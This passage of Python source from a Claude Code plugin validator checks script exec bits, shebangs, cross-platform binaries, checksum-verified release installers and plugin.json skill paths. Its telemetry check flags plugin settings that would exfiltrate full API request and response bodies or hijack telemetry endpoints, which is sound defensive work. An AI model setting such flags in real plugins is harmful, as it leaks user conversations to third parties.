    ``OTEL_LOG_RAW_API_BODIES=1`` in plugin env (CRITICAL — full
    request/response exfil), prompt-exfil flags (MAJOR), endpoint hijack
    (MAJOR), and any plugin-shipped OTEL var (MINOR — telemetry config
    belongs in ``managed-settings.json``).

    The check stays silent when the plugin has no OTEL configuration at
    all — PASSED-only results from the standalone validator are dropped to
    avoid noise in the umbrella output for the 99% of plugins that don't
    ship telemetry config.
    """
    # PLC0415: import inside the function to avoid pulling validate_telemetry
    # at module import time. Multiple agents may add umbrella entries; this
    # keeps the import surface stable across merges.
    from validate_telemetry import scan_plugin_for_telemetry  # noqa: PLC0415

    tel_report = scan_plugin_for_telemetry(plugin_root)

    # Merge findings, filtering PASSED noise — the umbrella does not need
    # a separate "telemetry passed" line for every clean plugin.
    for result in tel_report.results:
        if result.level == "PASSED":
            continue
        report.add(result.level, result.message, result.file, result.line)


def _has_shebang(path: Path) -> bool:
    """Check if a file starts with a shebang (#!) line."""
    try:
        with open(path, "rb") as f:
            return f.read(2) == b"#!"
    except OSError:
        return False


def validate_scripts(plugin_root: Path, report: ValidationReport) -> None:
    """Validate scripts/ structure — exec bits + shebangs ONLY.

    v2.64.0: the lint pieces that lived here (ruff / mypy / shellcheck /
    eslint / PSScriptAnalyzer / gofmt / cargo) moved to
    `cpv_lint_engine.lint_repo`, which is invoked by the main `validate()`
    flow as a separate REPO LINT phase. That gives us a single source of
    truth for linting and lets every linter resolve via uvx / bunx / npx /
    docker without polluting the host.

    What stays here: scripts/-specific structural checks that don't make
    sense at the whole-repo level — exec-bit verification on .sh/.bash
    files and shebang enforcement on script extensions.
    """
    scripts_dir = plugin_root / "scripts"

    if not scripts_dir.is_dir():
        report.info("No scripts/ directory found")
        return

    # --- Shell scripts (.sh, .bash) — exec-bit only; lint runs in REPO LINT ---
    sh_files = list(scripts_dir.glob("*.sh")) + list(scripts_dir.glob("*.bash"))
    for sh_file in sh_files:
        # os.access(..., X_OK) is unreliable on Windows (NTFS ACLs don't map
        # to POSIX exec bits), so skip the exec-bit check there. Users on
        # Windows won't be executing .sh scripts directly from PowerShell/cmd
        # anyway; the check is a Unix portability safeguard.
        if IS_WINDOWS:
            report.passed(
                f"Shell script present (exec bit not checked on Windows): {sh_file.name}",
                f"scripts/{sh_file.name}",
            )
        elif not os.access(sh_file, os.X_OK):
            report.major(f"Shell script not executable: {sh_file.name}", f"scripts/{sh_file.name}")
        else:
            report.passed(f"Shell script executable: {sh_file.name}", f"scripts/{sh_file.name}")

    # Check Python scripts with shebang are executable (Unix only)
    if not IS_WINDOWS:
        if scripts_dir.is_dir():
            for py_file in scripts_dir.glob("*.py"):
                if _has_shebang(py_file) and not os.access(py_file, os.X_OK):
                    # fixable=True + fix_id="chmod-exec" is an ADDITIVE fix-routing
                    # tag (Phase 2, TRDD-GVMOKJBB) — the WARNING severity and the
                    # message text are unchanged. This finding's own precondition
                    # (`_has_shebang(py_file)`) GUARANTEES a shebang is present, so
                    # cpv_codemod's `chmod-exec` transform (chmod +x a shebang file)
                    # is a 100%-deterministic clear. No OTHER "not executable"
                    # finding is shebang-gated (a `.sh`/`bin/` file may lack a
                    # shebang), so none is tagged — they stay INTEL per the
                    # conservative "unsure ⇒ leave it intel" rule. `warning()` does
                    # not forward fixable/fix_id, so add() is used directly.
                    report.add(
                        "WARNING",
                        f"scripts/{py_file.name} has shebang but is not executable — run: chmod +x scripts/{py_file.name}",
                        f"scripts/{py_file.name}",
                        fixable=True,
                        fix_id="chmod-exec",
                    )

    # Check shebangs on script files — scripts without shebangs may not run cross-platform
    shebang_extensions = {".py", ".sh", ".bash", ".rb", ".pl", ".php"}
    # __init__.py and _-prefixed files are module markers/internal modules — never need shebangs
    all_scripts = [
        f
        for f in scripts_dir.iterdir()
        if f.is_file()
        and f.suffix.lower() in shebang_extensions
        and f.name != "__init__.py"
        and not f.stem.startswith("_")
    ]
    scripts_missing_shebang = []
    for script in all_scripts:
        try:
            with open(script, errors="replace") as f:
                first_line = f.readline().rstrip("\n")
            if not first_line.startswith("#!"):
                scripts_missing_shebang.append(script.name)
        except (OSError, UnicodeDecodeError):
            pass
    if scripts_missing_shebang:
        report.minor(
            f"Scripts missing shebang (e.g. #!/usr/bin/env python3): {', '.join(sorted(scripts_missing_shebang))}. Without a shebang, scripts may not run correctly across platforms.",
            "scripts/",
        )


# =============================================================================
# Cross-Platform Compatibility Validation
# =============================================================================

# Script extensions and their platform availability
# Each entry: extension -> (language_name, available_platforms, notes)
SCRIPT_PLATFORM_MAP: dict[str, tuple[str, set[str], str]] = {
    ".sh": ("Bash/Shell", {"macos", "linux"}, "Not natively available on Windows"),
    ".bash": ("Bash", {"macos", "linux"}, "Not natively available on Windows"),
    ".zsh": ("Zsh", {"macos"}, "Not standard on Linux or Windows"),
    ".fish": ("Fish shell", set(), "Requires separate installation on all platforms"),
    ".ps1": ("PowerShell", {"windows"}, "Requires pwsh installation on macOS/Linux"),
    ".bat": ("Windows Batch", {"windows"}, "Not available on macOS or Linux"),
    ".cmd": ("Windows Batch", {"windows"}, "Not available on macOS or Linux"),
    ".nix": ("Nix", {"linux"}, "Not standard on macOS or Windows"),
}

# Cross-platform script languages (available everywhere with standard install)
CROSSPLATFORM_EXTENSIONS = {
    ".py",  # Python — widely available
    ".js",  # Node.js — widely available
    ".ts",  # TypeScript (via tsx/ts-node) — widely available
    ".mjs",  # ES module JavaScript
    ".cjs",  # CommonJS JavaScript
    ".rb",  # Ruby — often pre-installed on macOS
}

# Compiled binary extensions by platform
BINARY_PLATFORM_SUFFIXES: dict[str, str] = {
    # macOS
    "-darwin-arm64": "macOS ARM64 (Apple Silicon)",
    "-darwin-amd64": "macOS x86_64 (Intel)",
    "-darwin-x86_64": "macOS x86_64 (Intel)",
    "-darwin-universal": "macOS Universal",
    "-macos-arm64": "macOS ARM64 (Apple Silicon)",
    "-macos-amd64": "macOS x86_64 (Intel)",
    "-macos-x86_64": "macOS x86_64 (Intel)",
    # Linux
    "-linux-arm64": "Linux ARM64",
    "-linux-amd64": "Linux x86_64",
    "-linux-x86_64": "Linux x86_64",
    # Windows
    "-windows-arm64.exe": "Windows ARM64",
    "-windows-amd64.exe": "Windows x86_64",
    "-windows-x86_64.exe": "Windows x86_64",
}

# Minimum recommended platform set for compiled binaries
RECOMMENDED_PLATFORMS = {
    "macOS ARM64 (Apple Silicon)",
    "macOS x86_64 (Intel)",
    "Linux x86_64",
}

# Shebang interpreters that mark a file as an interpreted script rather than a compiled binary.
# Matches `#!/usr/bin/env python3`, `#!/bin/bash`, `#!/usr/bin/python3.12`, etc.
# `\b(name)[\d.]*` allows versioned interpreters like python3 / python3.12 / node18.
_SCRIPT_SHEBANG_RE = re.compile(r"^#!.*\b(python|bash|sh|node|deno|ruby|perl|pwsh|fish|zsh|tclsh)[\d.]*\b")


def _file_has_script_shebang(path: Path) -> bool:
    """Return True if the file starts with a shebang pointing at a known interpreter.

    Used to distinguish portable extensionless scripts (e.g. ``bin/my-tool``
    starting with ``#!/usr/bin/env python3``) from genuine compiled binaries
    that happen to lack an extension.
    """
    try:
        with path.open("rb") as fh:
            head = fh.read(256)
    except (OSError, PermissionError):
        return False
    if not head.startswith(b"#!"):
        return False
    try:
        first_line = head.split(b"\n", 1)[0].decode("utf-8", errors="replace")
    except (UnicodeDecodeError, ValueError):
        return False
    return bool(_SCRIPT_SHEBANG_RE.match(first_line))


def _is_python_venv(dirpath: Path) -> bool:
    """Detect Python virtual environments by structural markers, not name.

    A directory is a venv if it contains pyvenv.cfg (created by python -m venv
    and virtualenv). This catches venvs regardless of name (.venv, .windows_venv,
    .virtualenv, my_env, etc.).
    """
    # pyvenv.cfg is the canonical marker — always created by venv/virtualenv
    if (dirpath / "pyvenv.cfg").is_file():
        return True
    # Fallback: bin/activate (Unix) or Scripts/activate.bat (Windows)
    if (dirpath / "bin" / "activate").is_file():
        return True
    if (dirpath / "Scripts" / "activate.bat").is_file():
        return True
    return False


def validate_bin_executables(plugin_root: Path, report: ValidationReport) -> None:
    """Validate bin/ directory — executables added to Bash tool's PATH (v2.1.91).

    Files in bin/ are invokable as bare commands from the Bash tool while the
    plugin is enabled. Files that look like executables (no extension, or script
    extensions) must be executable. Data files, libraries, and configs are skipped.
    """
    bin_dir = plugin_root / "bin"
    if not bin_dir.is_dir():
        return

    bin_files = [f for f in bin_dir.iterdir() if f.is_file()]
    if not bin_files:
        report.info("bin/ directory exists but is empty")
        return

    # FP issue #127: a gitignored-AND-untracked bin/ file (a macOS `.DS_Store`,
    # `Thumbs.db`, an editor temp file, `__pycache__`) never ships in
    # `git archive` / the publish tarball, so it should not be checked for the
    # exec bit. Compute the git-accurate unshipped set once (v2.126.26
    # semantics): a TRACKED file is still scanned even if gitignored (it ships),
    # an untracked+gitignored file is skipped, and a non-git tree (None) scans
    # everything (the present tree IS the artifact). FN-safe: a real tracked,
    # shipped non-executable script in bin/ still flags.
    unshipped = gitignored_unshipped_paths(plugin_root)

    # Extensions that indicate data/library files — skip executable check
    data_extensions = {
        ".dll",
        ".so",
        ".dylib",
        ".a",
        ".lib",
        ".o",
        ".obj",  # Libraries
        ".json",
        ".yaml",
        ".yml",
        ".toml",
        ".ini",
        ".cfg",  # Config
        ".txt",
        ".md",
        ".csv",
        ".log",  # Data/docs
        ".pem",
        ".crt",
        ".key",  # Certificates
        ".wasm",  # WebAssembly modules
    }
    # Extensions that indicate scripts — should be executable
    script_extensions = {".sh", ".bash", ".py", ".rb", ".pl", ".js", ".ts", ".ps1"}

    executable_count = 0
    for bin_file in bin_files:
        # FP issue #127: skip a gitignored-AND-untracked bin/ file — it does not
        # ship, so its exec bit is irrelevant. None ⇒ non-git tree ⇒ scan all.
        if unshipped is not None and path_is_unshipped(
            bin_file.relative_to(plugin_root).as_posix(), unshipped
        ):
            continue
        ext = bin_file.suffix.lower()
        if ext in data_extensions:
            continue  # Skip data/library files
        # Files with no extension or script extensions should be executable
        if ext == "" or ext in script_extensions:
            # os.access(..., X_OK) on Windows is unreliable: NTFS ACL checks
            # don't map to POSIX exec bits, and every file often reports as
            # executable. Skip the exec check on Windows to avoid false
            # positives/negatives; the user's chmod advice is Unix-only anyway.
            if IS_WINDOWS:
                executable_count += 1
                report.passed(
                    f"bin/{bin_file.name} present (exec bit not checked on Windows)",
                    f"bin/{bin_file.name}",
                )
            elif not os.access(bin_file, os.X_OK):
                report.minor(
                    f"bin/{bin_file.name} is not executable — if this is a command, run: chmod +x bin/{bin_file.name}",
                    f"bin/{bin_file.name}",
                )
            else:
                executable_count += 1
                report.passed(f"bin/{bin_file.name} is executable", f"bin/{bin_file.name}")

    if executable_count > 0:
        report.passed(f"bin/ directory: {executable_count} executable(s) found")


# ── Release-asset installer detection (issue #117) ───────────────────────────
# A compiled-source plugin that ships its binaries as RELEASE ASSETS (out of
# tree) plus a checksum-verified installer is NOT "users will need to compile":
# the default install path is a sha256-verified prebuilt-binary download, with
# compiling only as a last-resort fallback. Committing multi-MB per-platform
# binaries into bin/ is the anti-pattern; the release-asset + installer model
# is the recommended distribution shape for a compiled helper. Detect it so the
# advisory compile WARNING does not fire on this legitimate class.
#
# Detection requires BOTH signals in the SAME installer script (kept narrow so
# a plain build script that merely runs `cargo build` cannot satisfy it):
#   (a) it DOWNLOADS a release asset — `gh release download`, OR a curl/wget of
#       a `.tar.gz`/`.tgz`/`.zip` (the release-tarball shape); and
#   (b) it VERIFIES the download — a `sha256`/`shasum`/`sha256sum -c` step.
# FN-safe: a Rust crate with no committed bin/ AND no such installer still WARNs
# (a build-only `install.sh` that compiles from source has no download+verify).
_INSTALLER_NAME_RE = re.compile(r"(?:^|[-_/])install[-_]?[a-z0-9]*\.sh$", re.IGNORECASE)
_RELEASE_DOWNLOAD_RE = re.compile(
    r"gh\s+release\s+download"  # gh CLI release-asset download
    r"|(?:curl|wget)\b[^\n]*\.(?:tar\.gz|tgz|zip)\b",  # curl/wget of a release tarball
    re.IGNORECASE,
)
_CHECKSUM_VERIFY_RE = re.compile(
    r"sha256sum\b|shasum\b|sha256\b|\.sha256\b",
    re.IGNORECASE,
)


def _has_release_asset_installer(plugin_root: Path) -> bool:
    """True iff the plugin ships an installer script that downloads a prebuilt
    release asset AND verifies it with a sha256 checksum (issue #117).

    Scans every ``install*.sh`` / ``*install*.sh`` in the tree (gitignore-aware
    when available). A match requires BOTH a release-download pattern and a
    checksum-verify pattern in the SAME file, so a build-from-source
    ``install.sh`` (no download/verify) does not qualify.
    """
    candidates: list[Path] = []
    walker = _gi.walk(plugin_root) if _gi else os.walk(plugin_root)
    for dirpath, _dirnames, filenames in walker:
        for filename in filenames:
            if _INSTALLER_NAME_RE.search(filename):
                candidates.append(Path(dirpath) / filename)
    for script in candidates:
        try:
            text = script.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        if _RELEASE_DOWNLOAD_RE.search(text) and _CHECKSUM_VERIFY_RE.search(text):
            return True
    return False


def validate_cross_platform(plugin_root: Path, report: ValidationReport) -> None:
    """Validate cross-platform compatibility of plugin scripts and binaries.

    Checks:
    1. Scripts using platform-specific languages get warnings
    2. Compiled source code without binaries or build script = MAJOR error
    3. Compiled binaries should cover all major platforms
    """
    # Collect all files across the entire plugin tree
    platform_specific_scripts: dict[str, list[str]] = {}  # ext -> [relative paths]
    compiled_source_files: dict[str, list[str]] = {}  # lang -> [relative paths]
    all_files: list[str] = []

    # Compiled language source extensions and their build system markers
    compiled_languages: dict[str, tuple[str, list[str]]] = {
        ".rs": ("Rust", ["Cargo.toml", "Cargo.lock"]),
        ".go": ("Go", ["go.mod", "go.sum"]),
        ".c": ("C", ["Makefile", "CMakeLists.txt", "meson.build"]),
        ".cpp": ("C++", ["Makefile", "CMakeLists.txt", "meson.build"]),
        ".cc": ("C++", ["Makefile", "CMakeLists.txt", "meson.build"]),
        ".cxx": ("C++", ["Makefile", "CMakeLists.txt", "meson.build"]),
        ".swift": ("Swift", ["Package.swift"]),
        ".zig": ("Zig", ["build.zig"]),
    }

    # Directories to always skip (build artifacts, caches, developer tooling)
    skip_dirs = {
        "__pycache__",
        "node_modules",
        "dist",
        "build",
        "target",
        ".eggs",
        "git-hooks",  # git hooks are developer tooling, not end-user components
        "tests",  # test fixtures may contain platform-specific scripts
        "fixtures",
    }

    # Use gitignore-aware walk to skip ignored files and directories
    for dirpath, dirnames, filenames in _gi.walk(plugin_root, skip_dirs=skip_dirs) if _gi else os.walk(plugin_root):
        if not _gi:
            # Fallback filtering when gitignore filter not initialized
            dirnames[:] = [
                d
                for d in dirnames
                if not d.startswith(".") and d not in skip_dirs and not _is_python_venv(Path(dirpath) / d)
            ]
        rel_dir = Path(dirpath).relative_to(plugin_root)

        for filename in filenames:
            ext = Path(filename).suffix.lower()
            rel_path = str(rel_dir / filename) if str(rel_dir) != "." else filename
            all_files.append(rel_path)

            if ext in SCRIPT_PLATFORM_MAP:
                platform_specific_scripts.setdefault(ext, []).append(rel_path)

            if ext in compiled_languages:
                lang_name = compiled_languages[ext][0]
                compiled_source_files.setdefault(lang_name, []).append(rel_path)

    # --- 1. Report platform-specific interpreted scripts ---
    # When a script has a portable fallback in the same directory (same stem with a
    # cross-platform extension, e.g. install.sh + install.py + install.ps1), demote
    # the warning to INFO since the user has covered the gap. This avoids the surprise
    # of getting a warning for portable POSIX shell scripts that ship alongside Python
    # or PowerShell wrappers.
    def _has_portable_fallback(rel_path: str, all_paths: list[str]) -> bool:
        p = Path(rel_path)
        stem = p.stem
        parent = str(p.parent)
        fallback_extensions = {".py", ".js", ".ts", ".rb", ".ps1"}
        for other in all_paths:
            op = Path(other)
            if op == p:
                continue
            if str(op.parent) == parent and op.stem == stem and op.suffix.lower() in fallback_extensions:
                return True
        return False

    if platform_specific_scripts:
        for ext, paths in platform_specific_scripts.items():
            lang_name, platforms, note = SCRIPT_PLATFORM_MAP[ext]
            covered_paths = [p for p in paths if _has_portable_fallback(p, all_files)]
            uncovered_paths = [p for p in paths if p not in covered_paths]
            if covered_paths:
                report.info(
                    f"Found {len(covered_paths)} {lang_name} script(s) ({ext}) with portable fallback "
                    f"(.py/.ps1/etc.) in the same directory — cross-platform coverage already in place."
                )
            if uncovered_paths:
                if platforms:
                    platforms_str = ", ".join(sorted(platforms))
                    report.warning(
                        f"Found {len(uncovered_paths)} {lang_name} script(s) ({ext}) — only natively available on {platforms_str}. {note}. Consider providing cross-platform alternatives or documenting requirements.",
                    )
                else:
                    report.warning(
                        f"Found {len(uncovered_paths)} {lang_name} script(s) ({ext}) — {note}. Consider providing cross-platform alternatives.",
                    )
    else:
        has_scripts = any(
            any(f.endswith(ext) for ext in CROSSPLATFORM_EXTENSIONS)
            for _, _, files in (_gi.walk(plugin_root, skip_dirs=skip_dirs) if _gi else os.walk(plugin_root))
            for f in files
        )
        if has_scripts:
            report.passed("All scripts use cross-platform languages")

    # --- 2. Check compiled source code has binaries or build script ---
    if compiled_source_files:
        # Search for bin/ directories recursively, skip gitignored paths
        bin_dirs = list(_gi.rglob("bin") if _gi else plugin_root.rglob("bin"))
        has_bin = any(d.is_dir() and any(d.iterdir()) for d in bin_dirs)

        # Issue #117: a checksum-verified release-asset installer means the
        # binaries ARE shipped (just out of tree), so "users will need to
        # compile" is false. Computed once here (not per-language) — it's a
        # whole-plugin property. When present, the compile WARNING is demoted
        # to INFO. FN-safe: a build-only install.sh (compiles from source, no
        # download+verify) does NOT satisfy _has_release_asset_installer, so a
        # genuinely compile-required plugin still WARNs.
        ships_release_binaries = _has_release_asset_installer(plugin_root)

        for lang_name, source_paths in compiled_source_files.items():
            # Find expected build system files for this language
            expected_build_files: set[str] = set()
            for ext, (ln, build_markers) in compiled_languages.items():
                if ln == lang_name:
                    expected_build_files.update(build_markers)

            # Build the set of directories to search for build markers/scripts:
            # the plugin root PLUS every ancestor directory of an actual
            # compiled-source file for this language (the source paths are
            # plugin-root-relative, e.g. "tools/memgrep/src/main.rs"). A crate
            # bundled under a non-standard root (tools/<crate>/) keeps its
            # Cargo.toml / build.sh next to its src/, so a root-only check
            # falsely reports "no build script" (issue #75 class 5). This only
            # WIDENS the lookup to the dirs that contain (or sit above) the
            # source — it does NOT exempt the dir from RC-NONSTD-DIR-001, and it
            # is FN-safe: a crate with no marker anywhere from its dir up to root
            # still reports MAJOR.
            search_dirs: set[Path] = {plugin_root}
            for rel in source_paths:
                d = (plugin_root / rel).parent
                # Climb from the source file's directory up to (not past) the
                # plugin root. `plugin_root in d.parents` is the provably-
                # terminating bound: once d == plugin_root we add it and stop.
                while plugin_root in d.parents or d == plugin_root:
                    search_dirs.add(d)
                    if d == plugin_root:
                        break
                    d = d.parent

            # Check if build system files exist in any of those directories.
            has_build_system = any((d / bf).exists() for d in search_dirs for bf in expected_build_files)

            # Check for a generic build/install script in any of those directories.
            _generic_build_scripts = [
                "build.sh",
                "install.sh",
                "setup.sh",
                "compile.sh",
                "build.py",
                "install.py",
                "setup.py",
                "Makefile",
                "justfile",
                "Taskfile.yml",
            ]
            has_build_script = any((d / s).exists() for d in search_dirs for s in _generic_build_scripts)

            if has_bin:
                report.info(f"Found {len(source_paths)} {lang_name} source file(s) with compiled binaries in bin/")
            elif has_build_system or has_build_script:
                if ships_release_binaries:
                    # Issue #117: binaries shipped as checksum-verified release
                    # assets — default install path downloads a prebuilt binary,
                    # compiling is only a fallback. Not a "must compile" case.
                    report.info(
                        f"Found {len(source_paths)} {lang_name} source file(s) with build system; prebuilt "
                        "binaries are shipped as checksum-verified release assets via an installer script "
                        "(out-of-tree distribution — no in-tree compile required)."
                    )
                else:
                    report.warning(
                        f"Found {len(source_paths)} {lang_name} source file(s) with build system but no pre-compiled binaries in bin/. Users will need to compile before use."
                    )
            else:
                report.major(
                    f"Found {len(source_paths)} {lang_name} source file(s) but no compiled binaries in bin/ and no build script (build.sh, install.sh, Makefile, etc.). Provide pre-compiled binaries or a build/install script."
                )

    # --- 3. Check compiled binaries platform coverage ---
    # Search for bin/ directories recursively, skip gitignored paths
    all_bin_dirs = []
    for d in _gi.rglob("bin") if _gi else plugin_root.rglob("bin"):
        if not d.is_dir():
            continue
        # Also skip venvs detected structurally
        rel_parts = d.relative_to(plugin_root).parts[:-1]
        if any(_is_python_venv(plugin_root / Path(*rel_parts[: i + 1])) for i in range(len(rel_parts))):
            continue
        all_bin_dirs.append(d)
    if not all_bin_dirs:
        return

    binary_files: list[str] = []
    detected_platforms: set[str] = set()
    base_names: set[str] = set()

    for bin_dir in all_bin_dirs:
        for item in bin_dir.rglob("*"):
            if not item.is_file():
                continue
            name = item.name
            rel_path = str(item.relative_to(plugin_root))

            for suffix, platform_name in BINARY_PLATFORM_SUFFIXES.items():
                if suffix in name.lower():
                    binary_files.append(rel_path)
                    detected_platforms.add(platform_name)
                    base = name[: name.lower().index(suffix.split("-")[0] + "-")]
                    if base.endswith("-"):
                        base = base[:-1]
                    base_names.add(base)
                    break
            else:
                if not item.suffix and os.access(item, os.X_OK):
                    # Skip portable interpreted scripts (Python/Bash/Node/etc.) — they have a
                    # shebang and run on every platform without compilation. Treating them as
                    # compiled binaries produces false-positive "missing platform suffix" warnings.
                    if _file_has_script_shebang(item):
                        continue
                    binary_files.append(rel_path)
                    base_names.add(name)
                elif item.suffix == ".exe":
                    binary_files.append(rel_path)
                    detected_platforms.add("Windows")
                    base_names.add(item.stem)
                elif item.suffix in {".dylib", ".so"}:
                    binary_files.append(rel_path)
                    if item.suffix == ".dylib":
                        detected_platforms.add("macOS")
                    else:
                        detected_platforms.add("Linux")

    if not binary_files:
        return

    report.info(f"Found {len(binary_files)} compiled binary file(s) for {len(base_names)} tool(s)")

    if detected_platforms:
        missing = RECOMMENDED_PLATFORMS - detected_platforms
        if missing:
            missing_str = ", ".join(sorted(missing))
            report.warning(
                f"Compiled binaries missing for: {missing_str}. Detected platforms: {', '.join(sorted(detected_platforms))}. Consider providing binaries for all major platforms."
            )
        else:
            report.passed(f"Compiled binaries cover recommended platforms: {', '.join(sorted(detected_platforms))}")
    else:
        report.warning(
            f"Found {len(binary_files)} binary file(s) without platform identifiers in filename. Use naming convention like 'tool-darwin-arm64', 'tool-linux-amd64', 'tool-windows-amd64.exe' for multi-platform support."
        )


def validate_manifest_skill_paths(plugin_root: Path, report: ValidationReport) -> bool:
    """Validate the optional ``skills`` path-list in plugin.json (CC v2.1.136+).

    Per CC v2.1.136 changelog: a ``skills`` entry in plugin.json HIDES the
    plugin's default ``skills/`` directory (auto-discovery is suppressed)
    and listing a file path that doesn't exist now shows an error in
    ``claude plugin validate``. CPV mirrors that behaviour:

    - When ``manifest["skills"]`` is absent or not a list, this function
      is a no-op and ``validate_skills`` continues with the default
      ``skills/`` directory walk.
    - When ``manifest["skills"]`` is a list, every entry is validated
      against the filesystem. Each entry may be either:
        - a folder path containing ``SKILL.md`` (e.g. ``skills/my-skill/``)
        - a direct ``SKILL.md`` file path (e.g. ``skills/my-skill/SKILL.md``)
      Missing paths emit MAJOR (not WARNING) — they break the plugin's
      skill discovery silently in CC < v2.1.136 and produce a hard error
      in ≥ v2.1.136.

    Returns ``True`` when the manifest declares a ``skills`` array (so
    the caller can suppress the default ``skills/`` directory walk),
    ``False`` otherwise. Mirrors the CC loader: a present ``skills`` field
    is authoritative — it does not augment the default discovery.
    """
    plugin_json = plugin_root / ".claude-plugin" / "plugin.json"
    if not plugin_json.is_file():
        return False
    try:
        manifest = json.loads(plugin_json.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return False
    if not isinstance(manifest, dict):
        return False
    skills_field = manifest.get("skills")
    if skills_field is None:
        return False
    if not isinstance(skills_field, list):
        report.major(
            f"plugin.json::skills must be a list of paths (got "
            f"{type(skills_field).__name__}). CC v2.1.136+ rejects non-list "
            f"values and the field overrides the default skills/ directory.",
            ".claude-plugin/plugin.json",
        )
        return True  # field IS declared (just malformed) — suppress default walk
    for i, entry in enumerate(skills_field):
        if not isinstance(entry, str):
            report.major(
                f"plugin.json::skills[{i}] must be a string path (got "
                f"{type(entry).__name__}). CC v2.1.136+ rejects non-string entries.",
                ".claude-plugin/plugin.json",
            )
            continue
        # Resolve relative to plugin root; reject path-traversal.
        candidate = (plugin_root / entry).resolve()
        try:
            candidate.relative_to(plugin_root.resolve())
        except ValueError:
            report.major(
                f"plugin.json::skills[{i}] = {entry!r} escapes the plugin root "
                f"(resolved to {candidate}). Reject for security.",
                ".claude-plugin/plugin.json",
            )
            continue
        # Accept either a directory containing SKILL.md OR a direct SKILL.md.
        if candidate.is_dir():
            if not (candidate / "SKILL.md").is_file():
                report.major(
                    f"plugin.json::skills[{i}] = {entry!r} is a directory but "
                    f"contains no SKILL.md. CC v2.1.136+ shows this as an error "
                    f"in `claude plugin validate`.",
                    ".claude-plugin/plugin.json",
                )
        elif candidate.is_file():
            if candidate.name != "SKILL.md":
                report.major(
                    f"plugin.json::skills[{i}] = {entry!r} is a file but not a "
                    f"SKILL.md (got {candidate.name!r}). CC v2.1.136+ requires "
                    f"either a folder containing SKILL.md or a direct SKILL.md path.",
                    ".claude-plugin/plugin.json",
                )
            else:
                # v2.1.145: `claude plugin validate` now flags file entries
                # (even SKILL.md) and suggests the parent directory. The
                # entry still works at runtime (CC v2.1.142+ surfaces a
                # root-level SKILL.md as a skill), so MINOR is the right
                # tier — flag the antipattern, do not fail validation.
                parent_rel = Path(entry).parent.as_posix() or "."
                report.minor(
                    f"plugin.json::skills[{i}] = {entry!r} points at a file. "
                    f"CC v2.1.145 `claude plugin validate` flags file entries "
                    f"— use the parent directory {parent_rel!r} instead.",
                    ".claude-plugin/plugin.json",
                )
        else:
            report.major(
                f"plugin.json::skills[{i}] = {entry!r} does not exist on disk. "
                f"CC v2.1.136+ shows this as an error instead of failing silently.",
                ".claude-plugin/plugin.json",
            )
    return True


def _validate_declared_skill_contents(
    plugin_root: Path,
    report: ValidationReport,
    skip_platform_checks: list[str] | None,
) -> None:
    """Run the comprehensive 190-rule validator on each declared skill.

    Called when ``plugin.json`` declares a ``skills`` array. The path-existence
    findings are already emitted by ``validate_manifest_skill_paths``; this
    function adds the *content* validation (frontmatter, name/description,
    token budget, skill security suite) that path-existence checks do NOT
    cover — without it, a plugin that opts into an explicit ``skills`` array
    gets its skills validated for existence only and a broken/oversized skill
    body ships clean.

    Only entries that resolve to an EXISTING skill directory (a folder
    containing SKILL.md, or the parent of a directly-listed SKILL.md) are
    content-validated; missing/malformed entries already produced their MAJOR
    in ``validate_manifest_skill_paths`` and have no body to validate. Each
    resolved directory is validated once (de-duplicated), mirroring the
    default ``skills/`` walk's flags and path-prefix transfer.
    """
    plugin_json = plugin_root / ".claude-plugin" / "plugin.json"
    if not plugin_json.is_file():
        return
    try:
        manifest = json.loads(plugin_json.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return
    if not isinstance(manifest, dict):
        return
    skills_field = manifest.get("skills")
    if not isinstance(skills_field, list):
        return

    plugin_root_resolved = plugin_root.resolve()
    seen: set[Path] = set()
    for entry in skills_field:
        if not isinstance(entry, str):
            continue
        candidate = (plugin_root / entry).resolve()
        # Reject path-traversal (validate_manifest_skill_paths already emitted
        # the MAJOR for these — never validate content outside the plugin root).
        try:
            candidate.relative_to(plugin_root_resolved)
        except ValueError:
            continue
        # Resolve the entry to the skill DIRECTORY: a folder containing
        # SKILL.md → the folder itself; a direct SKILL.md file → its parent.
        if candidate.is_dir() and (candidate / "SKILL.md").is_file():
            skill_dir = candidate
        elif candidate.is_file() and candidate.name == "SKILL.md":
            skill_dir = candidate.parent
        else:
            # Missing / not-a-skill — already flagged by the path validator.
            continue
        if skill_dir in seen:
            continue
        seen.add(skill_dir)

        # Path prefix for transferred findings: the skill dir relative to the
        # plugin root (POSIX), so messages point at the real on-disk location
        # rather than a synthetic skills/<name> path.
        try:
            rel_prefix = skill_dir.resolve().relative_to(plugin_root_resolved).as_posix()
        except ValueError:
            rel_prefix = skill_dir.name
        skill_name = skill_dir.name

        skill_report = validate_skill_comprehensive(
            skill_dir,
            # Same flags as the default skills/ walk below: Nixtla strict mode
            # is a quality opinion (not Anthropic-validity), so keep it opt-in.
            strict_mode=False,
            strict_openspec=False,
            validate_pillars_flag=skill_name.startswith(("lang-", "convert-")),
            skip_platform_checks=skip_platform_checks,
        )
        for result in skill_report.results:
            file_path = f"{rel_prefix}/{result.file}" if result.file else rel_prefix
            report.add(result.level, result.message, file_path, result.line)


def validate_skills(plugin_root: Path, report: ValidationReport, skip_platform_checks: list[str] | None = None) -> None:
    """Validate all skills in the plugin's skills/ directory.

    Args:
        plugin_root: Path to plugin root directory
        report: ValidationReport to add results to
        skip_platform_checks: List of platforms to skip checks for (e.g., ['windows'])

    CC v2.1.136+ semantics: when plugin.json declares a ``skills`` array,
    that list is AUTHORITATIVE and the default ``skills/`` directory walk
    is suppressed. ``validate_manifest_skill_paths`` runs first and
    returns True when it consumed the field — in that case we still run the
    comprehensive per-skill content validator on each declared skill (the
    path validator only checks existence), then return so we don't fall
    through to the default ``skills/`` walk and double-validate.
    """
    if validate_manifest_skill_paths(plugin_root, report):
        # plugin.json::skills is the authoritative DISCOVERY source. The path
        # validator above checked existence/shape; now validate the CONTENT of
        # each declared skill (frontmatter, token budget, security suite) —
        # otherwise a whole class of plugins (those opting into an explicit
        # skills array) would get existence-only validation.
        _validate_declared_skill_contents(plugin_root, report, skip_platform_checks)
        return

    skills_dir = plugin_root / "skills"
    root_skill_md = plugin_root / "SKILL.md"

    if not skills_dir.is_dir():
        # CC v2.1.142: a plugin with a root-level SKILL.md and no skills/
        # subdirectory has that SKILL.md surfaced as a skill. Validate it with
        # the full skill validator, the same scrutiny a skills/<name>/ skill
        # gets — anything less would let a broken root-level skill ship.
        if root_skill_md.is_file():
